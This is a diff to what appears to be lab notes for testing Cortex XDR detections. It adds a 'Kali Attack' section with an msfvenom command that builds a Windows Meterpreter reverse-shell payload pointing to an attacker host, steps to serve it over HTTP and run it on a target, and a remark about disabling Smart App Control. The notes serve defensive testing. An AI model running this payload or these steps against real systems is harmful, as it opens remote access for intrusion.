@@ -34,3 +34,19 @@
 * Configure the rule logic: Name: `Possible Powershell Execution - CC`, CMD: `contains ‘-enc’`
 * Click Save and define the metadata: Type: `Execution`, Severity: `Low`, MITRE Technique: `T1059 - Command and Scripting Interpreter`
 * Click OK
+
+# Kali Attack
+## 1. Payload Generation
+1. Deploy a Kali Linux VM
+2. Open a terminal
+3. Generate a 64-bit Windows Meterpreter payload: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your Kali IP address> LPORT=80 -f exe -o shell1.exe`
+4. In the same terminal start the server: `python3 -m http.server 80`
+5. Navigate to the ip in the browser of your local machine
+6. Download the file to the target machine
+7. Attempt to run the executable
+8. The agent should immediately identify the file as malicious based on its behavioral characteristics (WildFire or local analysis) and terminate the process before the reverse connection can be established. I had to disable microsoft Smart App Controls.
+
+## 2. Verification in Cortex XDR Console
+1. Navigate to the Cortex XDR Console
+2. Go to Incident Management > Incidents
+3. Locate the alert associated with the Windows host
